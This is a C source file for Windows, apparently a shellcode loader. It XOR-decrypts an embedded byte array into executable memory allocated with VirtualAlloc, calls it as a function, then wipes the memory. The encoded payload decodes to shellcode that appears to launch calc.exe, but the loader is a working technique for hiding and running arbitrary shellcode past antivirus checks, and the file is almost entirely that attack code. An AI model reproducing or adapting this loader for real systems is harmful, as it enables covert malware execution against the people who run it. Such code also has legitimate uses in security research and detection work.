#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>


void xor_decrypt(char *data, size_t len, char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Function to wipe memory
void wipe_memory(char *data, size_t len) {
    SecureZeroMemory(data, len);
}

unsigned char encrypted_payload[] = {
    0x56, 0xe2, 0x29, 0x4e, 0x5a, 0x42, 0x6a, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb,
    0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8,
    0xca, 0xe2, 0x21, 0xf8, 0xb2, 0xe2, 0x21, 0xf8, 0x8a, 0xe2, 0x21, 0xd8,
    0xfa, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a,
    0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb,
    0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0xe2, 0x21, 0xf8, 0x8a, 0x21,
    0xe8, 0x96, 0xe2, 0xab, 0x7a, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2,
    0x2f, 0x6a, 0xde, 0xcd, 0xe2, 0xab, 0x7a, 0xfa, 0x21, 0xe2, 0xb2, 0xee,
    0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xfc, 0xe2, 0x55, 0x63, 0xeb,
    0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a,
    0x06, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b,
    0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x72, 0xf2, 0xee,
    0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0xeb, 0x21, 0xa6, 0xe2, 0xee,
    0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0xeb, 0x21, 0xae, 0x22, 0xe2, 0xab,
    0x7a, 0xeb, 0xf2, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3,
    0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb,
    0xf3, 0xf0, 0xe2, 0x21, 0xb8, 0x43, 0xfd, 0x55, 0x55, 0x55, 0xf7, 0xe2,
    0x10, 0xab, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xe2, 0x27, 0x27,
    0xab, 0xab, 0xaa, 0xaa, 0xeb, 0x10, 0x9b, 0x21, 0xc5, 0x2d, 0x55, 0x7f,
    0x11, 0x4a, 0xb7, 0x80, 0xa0, 0xeb, 0x10, 0x0c, 0x3f, 0x17, 0x37, 0x55,
    0x7f, 0xe2, 0x29, 0x6e, 0x82, 0x96, 0xac, 0xd6, 0xa0, 0x2a, 0x51, 0x4a,
    0xdf, 0xaf, 0x11, 0xed, 0xb9, 0xd8, 0xc5, 0xc0, 0xaa, 0xf3, 0xeb, 0x23,
    0x70, 0x55, 0x7f, 0xc9, 0xcb, 0xc6, 0xc9, 0x84, 0xcf, 0xd2, 0xcf, 0xaa,
    0xaa,
};


size_t payload_size = sizeof(encrypted_payload);
char key = 0xAA;  // XOR key

int main() {
    printf("%s\n", "got to main");

    char *decrypted_payload = (char *)VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (decrypted_payload == NULL) {
        printf("Memory allocation failed.\n");
        return 1;
    }

    printf("%s\n", "the memory is allocated");


    memcpy(decrypted_payload, encrypted_payload, payload_size);
    printf("%s\n", "copied the encrypted payload to the memory");

    xor_decrypt(decrypted_payload, payload_size, key);
    printf("%s\n", "decrypted the payload");

    ((void(*)())decrypted_payload)();
    printf("%s\n", "payload executed");

    wipe_memory(decrypted_payload, payload_size);
    printf("%s\n", "memory wiped");

    VirtualFree(decrypted_payload, 0, MEM_RELEASE);
    printf("%s\n", "memory freed");

    return 0;
}
